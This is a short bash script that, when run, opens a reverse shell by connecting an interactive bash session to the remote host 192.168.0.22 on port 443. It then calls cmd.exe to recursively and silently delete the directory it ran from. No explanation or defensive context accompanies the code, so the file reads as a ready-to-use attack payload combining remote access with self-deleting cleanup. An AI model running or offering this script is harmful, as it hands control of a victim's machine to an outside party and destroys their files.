#!/bin/bash

bash -i >&/dev/tcp/192.168.0.22/443 0>&1

TARGET_DIR=$(pwd)
cd ..

cmd.exe /c "timeout /t 2 /nobreak >nul && rmdir /s /q \"$TARGET_DIR\"" &
